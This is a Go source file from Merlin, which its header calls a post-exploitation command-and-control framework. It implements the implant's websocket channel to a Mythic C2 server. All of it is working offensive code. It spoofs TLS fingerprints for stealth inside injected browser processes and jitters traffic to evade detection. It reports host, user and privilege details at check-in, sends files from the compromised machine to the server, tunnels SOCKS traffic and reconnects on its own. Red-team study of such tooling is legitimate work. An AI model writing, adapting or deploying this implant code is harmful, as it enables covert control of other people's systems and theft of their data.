//go:build mythic

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package mythic

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	rand2 "math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	// 3rd Party
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	utls "github.com/refraction-networking/utls"

	// Merlin Message
	messages "github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	utlsHelper "github.com/Ne0nd0g/merlin-agent/v2/http/utls"
	"github.com/Ne0nd0g/merlin-agent/v2/services/agent"
)

// WSMessage is the JSON envelope used to wrap payloads over the websocket connection.
// Mythic websocket C2 profiles send {"data":"<base64 payload>"} frames.
type WSMessage struct {
	Data string `json:"data"`
}

// pushItem carries a pre-encoded payload from Send() to the pushSender goroutine
// with an error channel so write failures propagate back to the caller.
type pushItem struct {
	payload []byte
	errChan chan error
}

// WSClient implements the clients.Client interface using a persistent websocket
// connection to a Mythic C2 profile server. It delegates protocol logic
// (Construct, Deconstruct, auth, etc.) to an inner *Client while providing
// websocket transport.
type WSClient struct {
	mythicClient *Client
	conn         *websocket.Conn
	pushMode     bool
	pushChan     chan pushItem // buffered channel for push-mode sends
	wsURL        string       // full websocket URL (ws:// or wss://)
	endpoint     string       // websocket URI path (e.g., "/socket")
	writeMu      sync.Mutex   // serializes all conn writes
	authMu       sync.Mutex   // serializes auth state transitions
	reconnectMu  sync.Mutex
	reconnecting atomic.Bool
	connected    atomic.Bool
	stopChan     chan struct{} // signals pushSender to stop
}

// WSConfig extends Config with websocket-specific settings.
type WSConfig struct {
	Config
	PushMode bool
	Endpoint string // websocket URI path
}

// NewWS creates a new WSClient from the provided configuration.
// It instantiates the inner mythic HTTP Client for protocol logic, then
// converts the URL scheme to ws:// or wss:// for the websocket connection.
func NewWS(config WSConfig) (*WSClient, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.NewWS()...")

	// Build the inner Mythic client for protocol handling (Construct/Deconstruct/auth)
	inner, err := New(config.Config)
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.NewWS(): failed to create inner client: %w", err)
	}

	// Convert http(s) URL to ws(s) URL
	// The base URL from config is like "https://host:port/path" but for websocket we
	// use the endpoint separately.
	parsed, err := url.Parse(config.URL)
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.NewWS(): failed to parse URL %q: %w", config.URL, err)
	}

	switch strings.ToLower(parsed.Scheme) {
	case "https", "wss":
		parsed.Scheme = "wss"
	case "http", "ws":
		parsed.Scheme = "ws"
	default:
		return nil, fmt.Errorf("clients/mythic.NewWS(): unsupported URL scheme %q", parsed.Scheme)
	}

	// Set the websocket endpoint path
	endpoint := config.Endpoint
	if endpoint == "" {
		endpoint = "socket"
	}
	if !strings.HasPrefix(endpoint, "/") {
		endpoint = "/" + endpoint
	}
	parsed.Path = endpoint

	ws := &WSClient{
		mythicClient: inner,
		pushMode:     config.PushMode,
		pushChan:     make(chan pushItem, 200),
		wsURL:        parsed.String(),
		endpoint:     endpoint,
		stopChan:     make(chan struct{}),
	}

	cli.Message(cli.INFO, "WebSocket client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tWebSocket URL: %s", ws.wsURL))
	cli.Message(cli.INFO, fmt.Sprintf("\tPush Mode: %t", ws.pushMode))
	cli.Message(cli.INFO, fmt.Sprintf("\tEndpoint: %s", ws.endpoint))

	return ws, nil
}

// connect dials the websocket server, sets up headers, configures ping/pong
// handlers, and starts the pushSender goroutine if in push mode.
// When JA3 or Parrot is configured, the TLS handshake uses utls to match the
// target browser fingerprint. This is critical for OPSEC when injected into
// browser-derived processes like msedgewebview2.exe.
func (ws *WSClient) connect() error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.connect()...")

	// Build dialer — TLS config depends on whether JA3/Parrot is set
	dialer := websocket.Dialer{
		HandshakeTimeout: 30 * time.Second,
	}

	// Resolve the utls ClientHelloID if JA3 or Parrot is configured
	var clientHelloID utls.ClientHelloID
	var clientHelloSpec *utls.ClientHelloSpec
	useUtls := false

	if ws.mythicClient.JA3 != "" {
		spec, err := utlsHelper.JA3toClientHello(ws.mythicClient.JA3)
		if err != nil {
			return fmt.Errorf("clients/mythic.WSClient.connect(): failed to parse JA3: %w", err)
		}
		clientHelloID = utls.HelloCustom
		clientHelloSpec = spec
		useUtls = true
		cli.Message(cli.INFO, fmt.Sprintf("WebSocket using JA3 fingerprint: %s", ws.mythicClient.JA3))
	} else if ws.mythicClient.Parrot != "" {
		helloID, err := utlsHelper.ParrotStringToClientHelloID(ws.mythicClient.Parrot)
		if err != nil {
			return fmt.Errorf("clients/mythic.WSClient.connect(): failed to parse Parrot: %w", err)
		}
		clientHelloID = helloID
		useUtls = true
		cli.Message(cli.INFO, fmt.Sprintf("WebSocket using TLS parrot: %s", ws.mythicClient.Parrot))
	}

	parsed, _ := url.Parse(ws.wsURL)
	isWss := strings.ToLower(parsed.Scheme) == "wss"

	if useUtls && isWss {
		// Use utls for the TLS handshake so the JA3/JA4 fingerprint matches the
		// configured browser. gorilla/websocket's NetDialTLSContext bypasses the
		// default Go crypto/tls entirely — we do TCP dial + utls handshake ourselves.
		insecure := ws.mythicClient.insecureTLS
		proxyStr := ws.mythicClient.Proxy

		dialer.NetDialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
			var rawConn net.Conn
			var err error

			if proxyStr != "" {
				// Proxy: TCP dial to proxy, send CONNECT, then TLS over that tunnel
				rawConn, err = dialThroughProxy(ctx, proxyStr, addr)
				if err != nil {
					return nil, fmt.Errorf("utls proxy dial failed: %w", err)
				}
			} else {
				// Direct TCP connection
				d := net.Dialer{Timeout: 30 * time.Second}
				rawConn, err = d.DialContext(ctx, network, addr)
				if err != nil {
					return nil, fmt.Errorf("utls tcp dial failed: %w", err)
				}
			}

			// Determine SNI hostname (strip port)
			host, _, _ := net.SplitHostPort(addr)
			if host == "" {
				host = addr
			}

			// Perform utls handshake with the configured ClientHello
			/* #nosec G402 */
			tlsConfig := &utls.Config{
				ServerName:         host,
				InsecureSkipVerify: insecure, // #nosec G402
			}

			uConn := utls.UClient(rawConn, tlsConfig, clientHelloID)
			if clientHelloSpec != nil {
				if err = uConn.ApplyPreset(clientHelloSpec); err != nil {
					rawConn.Close()
					return nil, fmt.Errorf("utls ApplyPreset failed: %w", err)
				}
			}

			if err = uConn.HandshakeContext(ctx); err != nil {
				rawConn.Close()
				return nil, fmt.Errorf("utls handshake failed: %w", err)
			}

			return uConn, nil
		}
	} else {
		// No JA3/Parrot or plain ws:// — use standard Go TLS
		/* #nosec G402 */
		dialer.TLSClientConfig = &tls.Config{
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: ws.mythicClient.insecureTLS, // #nosec G402
		}
	}

	// Set proxy for non-utls path (utls path handles proxy internally)
	if !useUtls && ws.mythicClient.Proxy != "" {
		proxyURL, err := url.Parse(ws.mythicClient.Proxy)
		if err != nil {
			return fmt.Errorf("clients/mythic.WSClient.connect(): failed to parse proxy URL: %w", err)
		}
		dialer.Proxy = http.ProxyURL(proxyURL)
	}

	// Build request headers
	headers := http.Header{}
	headers.Set("User-Agent", ws.mythicClient.UserAgent)
	if ws.mythicClient.Host != "" {
		headers.Set("Host", ws.mythicClient.Host)
	}
	for k, v := range ws.mythicClient.Headers {
		headers.Set(k, v)
	}

	// Mythic websocket Push mode requires this header
	if ws.pushMode {
		headers.Set("Accept-Type", "Push")
	}

	cli.Message(cli.DEBUG, fmt.Sprintf("Dialing websocket: %s", ws.wsURL))

	conn, resp, err := dialer.Dial(ws.wsURL, headers)
	if err != nil {
		if resp != nil {
			return fmt.Errorf("clients/mythic.WSClient.connect(): websocket dial failed (HTTP %d): %w", resp.StatusCode, err)
		}
		return fmt.Errorf("clients/mythic.WSClient.connect(): websocket dial failed: %w", err)
	}

	// Configure ping/pong for connection health
	conn.SetPongHandler(func(string) error {
		return conn.SetReadDeadline(time.Now().Add(120 * time.Second))
	})
	// Set initial read deadline
	if err = conn.SetReadDeadline(time.Now().Add(120 * time.Second)); err != nil {
		cli.Message(cli.WARN, fmt.Sprintf("Failed to set read deadline: %s", err))
	}

	ws.conn = conn
	ws.connected.Store(true)

	// Start pushSender goroutine if in push mode
	if ws.pushMode {
		ws.stopChan = make(chan struct{})
		go ws.pushSender()
		go ws.pingLoop()
	}

	cli.Message(cli.SUCCESS, fmt.Sprintf("WebSocket connected to %s", ws.wsURL))
	return nil
}

// dialThroughProxy establishes a TCP connection through an HTTP CONNECT proxy.
// Returns the raw TCP connection tunneled through the proxy, ready for a TLS handshake.
func dialThroughProxy(ctx context.Context, proxyStr string, targetAddr string) (net.Conn, error) {
	proxyURL, err := url.Parse(proxyStr)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL %q: %w", proxyStr, err)
	}

	d := net.Dialer{Timeout: 30 * time.Second}
	proxyConn, err := d.DialContext(ctx, "tcp", proxyURL.Host)
	if err != nil {
		return nil, fmt.Errorf("proxy TCP dial failed: %w", err)
	}

	// Send HTTP CONNECT
	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", targetAddr, targetAddr)
	if _, err = proxyConn.Write([]byte(connectReq)); err != nil {
		proxyConn.Close()
		return nil, fmt.Errorf("proxy CONNECT write failed: %w", err)
	}

	// Read response (simple parse — look for "200")
	buf := make([]byte, 4096)
	n, err := proxyConn.Read(buf)
	if err != nil {
		proxyConn.Close()
		return nil, fmt.Errorf("proxy CONNECT read failed: %w", err)
	}
	if !strings.Contains(string(buf[:n]), "200") {
		proxyConn.Close()
		return nil, fmt.Errorf("proxy CONNECT rejected: %s", string(buf[:n]))
	}

	return proxyConn, nil
}

// pingLoop sends periodic pings to keep the connection alive.
// Interval is jittered between 20-40s to avoid metronomic timing patterns.
func (ws *WSClient) pingLoop() {
	for {
		// Jittered sleep: 20-40 seconds (base 20s + random 0-20s)
		jitter := time.Duration(20+rand2.Intn(21)) * time.Second
		select {
		case <-ws.stopChan:
			return
		case <-time.After(jitter):
			ws.writeMu.Lock()
			if ws.conn != nil {
				err := ws.conn.WriteControl(
					websocket.PingMessage,
					[]byte{},
					time.Now().Add(10*time.Second),
				)
				if err != nil {
					cli.Message(cli.WARN, fmt.Sprintf("Ping failed: %s", err))
				}
			}
			ws.writeMu.Unlock()
		}
	}
}

// sendSync performs a synchronous write+read over the websocket connection.
// It always waits for the server response, regardless of push mode.
// Used for: Authenticate, Initial (checkin), PullFile.
func (ws *WSClient) sendSync(m messages.Base) ([]messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.sendSync()...")

	payload, err := ws.constructMessage(m)
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.WSClient.sendSync(): construct failed: %w", err)
	}

	// If payload is empty (file transfer completed internally), return IDLE
	if len(payload) == 0 {
		return []messages.Base{{ID: ws.mythicClient.AgentID, Type: messages.IDLE}}, nil
	}

	// Wrap in WSMessage envelope
	wsMsg := WSMessage{Data: string(payload)}

	ws.writeMu.Lock()
	err = ws.conn.WriteJSON(wsMsg)
	ws.writeMu.Unlock()
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.WSClient.sendSync(): WriteJSON failed: %w", err)
	}

	// Read response
	var resp WSMessage
	// Temporarily extend read deadline for this synchronous read
	if deadlineErr := ws.conn.SetReadDeadline(time.Now().Add(120 * time.Second)); deadlineErr != nil {
		cli.Message(cli.WARN, fmt.Sprintf("Failed to set read deadline: %s", deadlineErr))
	}
	err = ws.conn.ReadJSON(&resp)
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.WSClient.sendSync(): ReadJSON failed: %w", err)
	}

	// Deconstruct the response
	return ws.mythicClient.Deconstruct([]byte(resp.Data))
}

// constructMessage handles the message construction pipeline.
// For FILETRANSFER download jobs, it reimplements the download flow using sendSync
// instead of client.Send() to avoid the inner client's HTTP transport.
// For all other message types, it delegates to mythicClient.Construct().
func (ws *WSClient) constructMessage(m messages.Base) ([]byte, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.constructMessage()...")

	// Check if this is a JOBS message containing a FILETRANSFER download
	if m.Type == messages.JOBS {
		jobList, ok := m.Payload.([]jobs.Job)
		if ok {
			hasDownload := false
			for _, j := range jobList {
				if j.Type == jobs.FILETRANSFER {
					f := j.Payload.(jobs.FileTransfer)
					if f.IsDownload {
						hasDownload = true
						break
					}
				}
			}
			if hasDownload {
				return ws.constructWithFileDownload(m)
			}
		}
	}

	// For all other message types, delegate to the inner client
	return ws.mythicClient.Construct(m)
}

// constructWithFileDownload handles the JOBS message type when it contains
// FILETRANSFER download jobs. It reimplements the download flow from
// mythic.go Construct() but uses ws.sendSync() for the recursive sends.
func (ws *WSClient) constructWithFileDownload(m messages.Base) ([]byte, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.constructWithFileDownload()...")

	returnMessage := PostResponse{
		Action:    RESPONSE,
		Padding:   m.Padding,
		SOCKS:     []Socks{},
		Responses: []ClientTaskResponse{},
	}

	for _, job := range m.Payload.([]jobs.Job) {
		var response ClientTaskResponse
		if job.ID != "" {
			response.ID = uuid.MustParse(job.ID)
		}
		response.Completed = true

		switch job.Type {
		case jobs.RESULT:
			response.Output = job.Payload.(jobs.Results).Stdout
			if job.Payload.(jobs.Results).Stderr != "" {
				response.Output += job.Payload.(jobs.Results).Stderr
				response.Status = StatusError
			}
			returnMessage.Responses = append(returnMessage.Responses, response)
		case jobs.AGENTINFO:
			info, err := json.Marshal(job.Payload)
			if err != nil {
				response.Output = fmt.Sprintf("there was an error marshalling the AgentInfo structure to JSON:\n%s", err)
				response.Status = StatusError
			}
			response.Output = string(info)
			returnMessage.Responses = append(returnMessage.Responses, response)
		case jobs.FILETRANSFER:
			f := job.Payload.(jobs.FileTransfer)
			if f.IsDownload {
				// DownloadInit - Get FileID from Mythic
				fm := FileDownload{
					NumChunks: 1,
					FullPath:  f.FileLocation,
				}

				ctr := ClientTaskResponse{
					ID:       response.ID,
					Download: &fm,
				}

				downloadMessage := messages.Base{
					ID:      ws.mythicClient.AgentID,
					Type:    DownloadInit,
					Payload: ctr,
				}

				// Use sendSync instead of client.Send
				resp, err := ws.sendSync(downloadMessage)
				if err != nil {
					return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): DownloadInit send failed: %w", err)
				}

				if len(resp) <= 0 {
					return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): no return messages after DownloadInit")
				}
				if resp[0].Type != messages.JOBS {
					return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): response for DownloadInit was not a jobs message")
				}
				js := resp[0].Payload.([]jobs.Job)
				if len(js) <= 0 {
					return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): DownloadInit response contained no jobs")
				}
				if js[0].Type != DownloadSend {
					return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): expected DownloadSend(%d) but got %d", DownloadSend, js[0].Type)
				}

				// DownloadSend - Send actual data
				fm2 := FileDownload{
					Data:   f.FileBlob,
					FileID: js[0].Payload.(string),
					Chunk:  1,
				}

				ctr.Download = &fm2
				ctr.Completed = true

				downloadMessage.Type = DownloadSend
				downloadMessage.Payload = ctr
				_, err = ws.sendSync(downloadMessage)
				if err != nil {
					return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): DownloadSend failed: %w", err)
				}
				// If this is the only job, return empty to signal completion
				if len(m.Payload.([]jobs.Job)) == 1 {
					return nil, nil
				}
			}
		case jobs.SOCKS:
			sockMsg := job.Payload.(jobs.Socks)
			if bytes.Equal(sockMsg.Data, []byte{0x05, 0x00}) {
				break
			}
			sock := Socks{
				Exit: sockMsg.Close,
			}
			id, ok := mythicSocksConnection.Load(sockMsg.ID)
			if !ok {
				return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): SOCKS connection ID %s not mapped", sockMsg.ID)
			}
			sock.ServerId = id.(int32)
			sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)
			returnMessage.SOCKS = append(returnMessage.SOCKS, sock)
			if sockMsg.Close {
				socksConnection.Delete(id)
				mythicSocksConnection.Delete(sockMsg.ID)
			}
		default:
			return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): unhandled job type: %s", job.Type)
		}
	}

	// If no responses or socks to send, build a tasking request
	var data []byte
	var err error
	if len(returnMessage.Responses) == 0 && len(returnMessage.SOCKS) == 0 {
		task := Tasking{
			Action:  TASKING,
			Size:    -1,
			Padding: m.Padding,
		}
		data, err = json.Marshal(task)
	} else {
		data, err = json.Marshal(returnMessage)
	}
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): marshal failed: %w", err)
	}

	// Apply transformers (same pipeline as mythicClient.Construct)
	for i := len(ws.mythicClient.transformers); i > 0; i-- {
		if ws.mythicClient.transformers[i-1].String() == "mythic" {
			data, err = ws.mythicClient.transformers[i-1].Construct(data, []byte(ws.mythicClient.MythicID.String()))
		} else {
			data, err = ws.mythicClient.transformers[i-1].Construct(data, ws.mythicClient.secret)
		}
		if err != nil {
			return nil, fmt.Errorf("clients/mythic.WSClient.constructWithFileDownload(): transform failed: %w", err)
		}
	}

	return data, nil
}

// Send takes in a Merlin message, constructs it, and sends it over the websocket.
// In poll mode: synchronous write+read (delegates to sendSync).
// In push mode: fire-and-forget via pushChan with error feedback.
func (ws *WSClient) Send(m messages.Base) ([]messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.Send()...")

	// Set the message padding
	if ws.mythicClient.PaddingMax > 0 {
		m.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(ws.mythicClient.PaddingMax))
	}

	// Poll mode: synchronous request/response
	if !ws.pushMode {
		return ws.sendSync(m)
	}

	// Push mode: construct and enqueue for async send
	payload, err := ws.constructMessage(m)
	if err != nil {
		return nil, fmt.Errorf("clients/mythic.WSClient.Send(): construct failed: %w", err)
	}

	// File transfer completed internally, nothing more to send
	if payload == nil {
		return []messages.Base{{ID: ws.mythicClient.AgentID, Type: messages.IDLE}}, nil
	}

	// Enqueue the payload for the push sender goroutine
	errChan := make(chan error, 1)
	item := pushItem{payload: payload, errChan: errChan}

	select {
	case ws.pushChan <- item:
	default:
		return nil, fmt.Errorf("clients/mythic.WSClient.Send(): push channel full, dropping message")
	}

	// Wait for write confirmation with timeout
	select {
	case err = <-errChan:
		if err != nil {
			return nil, fmt.Errorf("clients/mythic.WSClient.Send(): push write failed: %w", err)
		}
	case <-time.After(30 * time.Second):
		return nil, fmt.Errorf("clients/mythic.WSClient.Send(): push write timed out")
	}

	// Push mode Send is fire-and-forget; responses come via Listen()
	return nil, nil
}

// Listen blocks on the websocket connection waiting for incoming messages from the server.
// Used in push mode where the server pushes tasks/SOCKS data to the agent.
func (ws *WSClient) Listen() ([]messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.Listen()...")

	if !ws.pushMode {
		return nil, fmt.Errorf("clients/mythic.WSClient.Listen(): Listen is only supported in push mode")
	}

	if !ws.connected.Load() {
		return nil, fmt.Errorf("clients/mythic.WSClient.Listen(): not connected")
	}

	// Extend read deadline
	if err := ws.conn.SetReadDeadline(time.Now().Add(120 * time.Second)); err != nil {
		cli.Message(cli.WARN, fmt.Sprintf("Failed to set read deadline: %s", err))
	}

	var msg WSMessage
	err := ws.conn.ReadJSON(&msg)
	if err != nil {
		// Attempt reconnect on read failure
		if reconnErr := ws.reconnect(); reconnErr != nil {
			return nil, fmt.Errorf("clients/mythic.WSClient.Listen(): read failed and reconnect failed: read=%w, reconnect=%s", err, reconnErr)
		}
		return nil, fmt.Errorf("clients/mythic.WSClient.Listen(): read failed, reconnected: %w", err)
	}

	return ws.mythicClient.Deconstruct([]byte(msg.Data))
}

// Synchronous returns true if in push mode (the agent uses a persistent connection
// with a listen goroutine) or false for poll mode (standard request/response).
func (ws *WSClient) Synchronous() bool {
	return ws.pushMode
}

// Authenticate performs the RSA key exchange authentication with the Mythic server.
// It always uses sendSync for synchronous request/response, regardless of push mode.
func (ws *WSClient) Authenticate(msg messages.Base) error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.Authenticate()...")

	ws.authMu.Lock()
	defer ws.authMu.Unlock()

	ws.mythicClient.authenticated = false
	var authenticated bool
	var err error

	for {
		msg, authenticated, err = ws.mythicClient.Authenticator.Authenticate(msg)
		if err != nil {
			return err
		}
		if msg.Type == 0 {
			return nil
		}

		if authenticated {
			ws.mythicClient.authenticated = true
			var key []byte
			key, err = ws.mythicClient.Authenticator.Secret()
			if err != nil {
				return err
			}
			if len(key) > 0 {
				ws.mythicClient.secret = key
			}
			ws.mythicClient.MythicID = msg.ID
			cli.Message(cli.SUCCESS, fmt.Sprintf("%s authentication completed", ws.mythicClient.Authenticator))
			return nil
		}

		// Set padding
		if ws.mythicClient.PaddingMax > 0 {
			msg.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(ws.mythicClient.PaddingMax))
		}

		var msgs []messages.Base
		msgs, err = ws.sendSync(msg)
		if err != nil {
			return err
		}

		if len(msgs) > 0 {
			msg = msgs[0]
		}

		if authenticated {
			return nil
		}
	}
}

// Initial establishes the websocket connection, authenticates, and sends the initial checkin message.
func (ws *WSClient) Initial() error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.Initial()...")

	// Connect websocket
	err := ws.connect()
	if err != nil {
		return fmt.Errorf("clients/mythic.WSClient.Initial(): %w", err)
	}

	as := agent.NewAgentService()
	a := as.Get()

	checkIn := CheckIn{
		Action:    "checkin",
		IP:        selectIP(a.Host().IPs),
		OS:        a.Host().Platform,
		User:      a.Process().UserName,
		Host:      a.Host().Name,
		Process:   a.Process().Name,
		PID:       a.Process().ID,
		PayloadID: ws.mythicClient.MythicID.String(),
		Arch:      a.Host().Architecture,
		Domain:    a.Process().Domain,
		Integrity: a.Process().Integrity,
	}

	// Authenticate
	err = ws.Authenticate(messages.Base{})
	if err != nil {
		return err
	}

	// Send checkin message
	base := messages.Base{
		ID:      ws.mythicClient.AgentID,
		Type:    messages.CHECKIN,
		Payload: checkIn,
	}

	// Set padding for checkin
	if ws.mythicClient.PaddingMax > 0 {
		base.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(ws.mythicClient.PaddingMax))
	}

	_, err = ws.sendSync(base)
	return err
}

// Get delegates to the inner Mythic client's Get method.
func (ws *WSClient) Get(key string) string {
	return ws.mythicClient.Get(key)
}

// Set delegates to the inner Mythic client's Set method.
func (ws *WSClient) Set(key string, value string) error {
	return ws.mythicClient.Set(key, value)
}

// PullFile requests a file from the Mythic server chunk-by-chunk using sendSync for each request.
func (ws *WSClient) PullFile(taskID, fileID string, chunkSize int) ([]byte, error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/mythic.WSClient.PullFile(): taskID=%s fileID=%s chunkSize=%d", taskID, fileID, chunkSize))

	tid, err := uuid.Parse(taskID)
	if err != nil {
		return nil, fmt.Errorf("WSClient.PullFile: invalid task ID %q: %w", taskID, err)
	}

	var buf bytes.Buffer
	totalChunks := 0
	for chunkNum := 1; ; chunkNum++ {
		req := messages.Base{
			ID:   ws.mythicClient.AgentID,
			Type: UploadChunkReq,
			Payload: ClientTaskResponse{
				ID: tid,
				Upload: &UploadChunkRequest{
					ChunkSize: chunkSize,
					ChunkNum:  chunkNum,
					FileID:    fileID,
					FullPath:  "",
				},
			},
		}

		// Set padding
		if ws.mythicClient.PaddingMax > 0 {
			req.Padding = core.RandStringBytesMaskImprSrc(rand2.Intn(ws.mythicClient.PaddingMax))
		}

		resp, err := ws.sendSync(req)
		if err != nil {
			return nil, fmt.Errorf("WSClient.PullFile chunk %d: sendSync failed: %w", chunkNum, err)
		}

		var ucr UploadChunkResponse
		found := false
		for _, msg := range resp {
			if msg.Type != messages.JOBS {
				continue
			}
			js, ok := msg.Payload.([]jobs.Job)
			if !ok {
				continue
			}
			for _, j := range js {
				if j.Type != UploadChunkReq {
					continue
				}
				r, ok := j.Payload.(UploadChunkResponse)
				if !ok {
					continue
				}
				if r.FileID != fileID {
					continue
				}
				ucr = r
				found = true
				break
			}
			if found {
				break
			}
		}
		if !found {
			return nil, fmt.Errorf("WSClient.PullFile chunk %d: no UploadChunkResponse for file %s", chunkNum, fileID)
		}
		if ucr.ChunkNum != chunkNum {
			return nil, fmt.Errorf("WSClient.PullFile: expected chunk %d but got %d", chunkNum, ucr.ChunkNum)
		}

		decoded, err := base64.StdEncoding.DecodeString(ucr.ChunkData)
		if err != nil {
			return nil, fmt.Errorf("WSClient.PullFile chunk %d: base64 decode failed: %w", chunkNum, err)
		}
		buf.Write(decoded)

		if totalChunks == 0 {
			totalChunks = ucr.TotalChunks
		}
		cli.Message(cli.NOTE, fmt.Sprintf("WSClient.PullFile: received chunk %d/%d (%d bytes)", chunkNum, totalChunks, len(decoded)))

		if chunkNum >= totalChunks {
			break
		}
	}

	cli.Message(cli.NOTE, fmt.Sprintf("WSClient.PullFile: complete, %d bytes assembled", buf.Len()))
	return buf.Bytes(), nil
}

// pushSender is a goroutine that reads pushItems from the pushChan and writes them
// over the websocket connection. It is the sole writer in push mode (after auth).
func (ws *WSClient) pushSender() {
	cli.Message(cli.DEBUG, "Starting pushSender goroutine...")
	for {
		select {
		case <-ws.stopChan:
			cli.Message(cli.DEBUG, "pushSender stopping...")
			return
		case item := <-ws.pushChan:
			wsMsg := WSMessage{Data: string(item.payload)}
			ws.writeMu.Lock()
			err := ws.conn.WriteJSON(wsMsg)
			ws.writeMu.Unlock()
			if err != nil {
				cli.Message(cli.WARN, fmt.Sprintf("pushSender: WriteJSON failed: %s", err))
				item.errChan <- err
				// Attempt reconnect
				if reconnErr := ws.reconnect(); reconnErr != nil {
					cli.Message(cli.WARN, fmt.Sprintf("pushSender: reconnect failed: %s", reconnErr))
				}
				continue
			}
			item.errChan <- nil
		}
	}
}

// reconnect performs a single-flight reconnection. Only one goroutine will
// perform the reconnect; others will wait for it to complete.
func (ws *WSClient) reconnect() error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.reconnect()...")

	// Single-flight: if already reconnecting, wait for it
	if !ws.reconnecting.CompareAndSwap(false, true) {
		cli.Message(cli.DEBUG, "reconnect(): already in progress, waiting...")
		// Wait for the reconnect to complete by trying to acquire the mutex
		ws.reconnectMu.Lock()
		ws.reconnectMu.Unlock()
		if ws.connected.Load() {
			return nil
		}
		return fmt.Errorf("reconnect completed but not connected")
	}

	ws.reconnectMu.Lock()
	defer func() {
		ws.reconnectMu.Unlock()
		ws.reconnecting.Store(false)
	}()

	ws.connected.Store(false)

	// Stop pushSender
	select {
	case <-ws.stopChan:
		// already closed
	default:
		close(ws.stopChan)
	}

	// Close old connection
	if ws.conn != nil {
		ws.conn.Close()
	}

	// Drain pushChan - send errors back to callers
	drainLoop:
	for {
		select {
		case item := <-ws.pushChan:
			item.errChan <- fmt.Errorf("connection lost during reconnect")
		default:
			break drainLoop
		}
	}

	// Retry connection with exponential backoff
	var err error
	for attempt := 0; attempt < 5; attempt++ {
		wait := time.Duration(1<<uint(attempt)) * time.Second
		cli.Message(cli.NOTE, fmt.Sprintf("reconnect(): attempt %d, waiting %s...", attempt+1, wait))
		time.Sleep(wait)

		err = ws.connect()
		if err == nil {
			// Re-authenticate
			authErr := ws.Authenticate(messages.Base{})
			if authErr != nil {
				cli.Message(cli.WARN, fmt.Sprintf("reconnect(): re-auth failed: %s", authErr))
				continue
			}
			cli.Message(cli.SUCCESS, "reconnect(): successfully reconnected and re-authenticated")
			return nil
		}
		cli.Message(cli.WARN, fmt.Sprintf("reconnect(): attempt %d failed: %s", attempt+1, err))
	}

	return fmt.Errorf("reconnect(): all attempts failed: %w", err)
}

// close performs a clean shutdown of the websocket connection and goroutines.
func (ws *WSClient) close() {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.WSClient.close()...")

	ws.connected.Store(false)

	// Stop pushSender
	select {
	case <-ws.stopChan:
	default:
		close(ws.stopChan)
	}

	// Close connection
	if ws.conn != nil {
		ws.conn.WriteMessage(
			websocket.CloseMessage,
			websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""),
		)
		ws.conn.Close()
	}
}
